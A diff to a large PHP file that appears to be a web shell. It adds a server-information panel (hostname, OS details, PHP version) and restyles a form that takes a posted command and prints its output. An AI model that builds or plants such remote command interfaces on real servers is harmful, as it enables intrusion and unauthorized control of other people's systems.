@@ -3930,17 +3930,27 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
         </div>
     </div>
 
+    <!-- Server Info Section -->
+    <div class="server-info mt-5">
+        <h3>Server Information</h3>
+        <ul>
+            <li><strong>Hostname:</strong> <?php echo gethostname(); ?></li>
+            <li><strong>Operating System:</strong> <?php echo php_uname(); ?></li>
+            <li><strong>PHP Version:</strong> <?php echo phpversion(); ?></li>
+        </ul>
+    </div>
+
     <!-- Terminal Input Section -->
     <div class="terminal-input mt-5">
-        <h4>Terminal</h4>
+        <li><strong>Terminal:</strong></li>
         <form method="post" id="terminalForm">
             <!-- Resize the textarea with smaller size -->
-            <textarea id="terminalInput" name="command" class="form-control" rows="1" style="height: 10px; width: 30%;" placeholder="Enter Command.."></textarea>
+            <textarea id="terminalInput" name="command" class="form-control" rows="1" style="height: 60px; width: 30%;" placeholder="Enter Command.."></textarea>
             <button type="submit" class="btn btn-primary mt-3" style="font-size: 13px; padding: 3px 5px;">Run Command</button>
         </form>
         
-        <h4>Output:</h4>
-        <pre id="terminalOutput"><?php echo htmlspecialchars($output); ?></pre>
+        <li><strong>Output:</strong></li>
+        <strong><pre id="terminalOutput"><?php echo htmlspecialchars($output); ?></pre></strong>
     </div>
 </div>
 
@@ -3989,6 +3999,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
 </script>
 
 </body>
+
 
     <!-- Advance Search Modal -->
     <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
